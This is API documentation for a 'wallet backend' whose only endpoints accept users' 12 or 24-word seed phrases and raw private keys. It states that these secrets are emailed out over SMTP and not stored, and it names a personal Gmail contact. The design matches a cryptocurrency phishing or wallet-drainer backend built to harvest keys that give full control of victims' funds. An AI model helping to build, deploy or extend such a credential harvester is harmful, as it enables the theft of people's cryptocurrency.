# Wallet Backend API Documentation

## Base URL
`/api/wallet`

---

### POST `/api/wallet/seed`
**Description:** Submit a 12 or 24-word seed phrase.

**Request Body:**
```
{
  "phrase": ["word1", "word2", ..., "word12 or word24"]
}
```
- `phrase`: Array of 12 or 24 strings (words).

**Response:**
- `200 OK`: `{ message: 'Seed phrase received.' }`
- `400 Bad Request`: `{ error: '...' }`

---

### POST `/api/wallet/private-key`
**Description:** Submit a private key.

**Request Body:**
```
{
  "privateKey": "0x..." // 64 hex characters, with or without 0x
}
```
- `privateKey`: String, 64 hex characters (optionally prefixed with 0x).

**Response:**
- `200 OK`: `{ message: 'Private key received.' }`
- `400 Bad Request`: `{ error: '...' }`

---

## Security & Validation
- All inputs are validated and sanitized.
- Credentials are never stored, only emailed securely.

## Deployment
1. Copy `.env.example` to `.env` and fill in your SMTP credentials.
2. Run `npm install` to install dependencies.
3. Start the server with `npm start` (or `npm run dev` for development).

---

## Contact
For support, contact: oguntaderasaq30@gmail.com
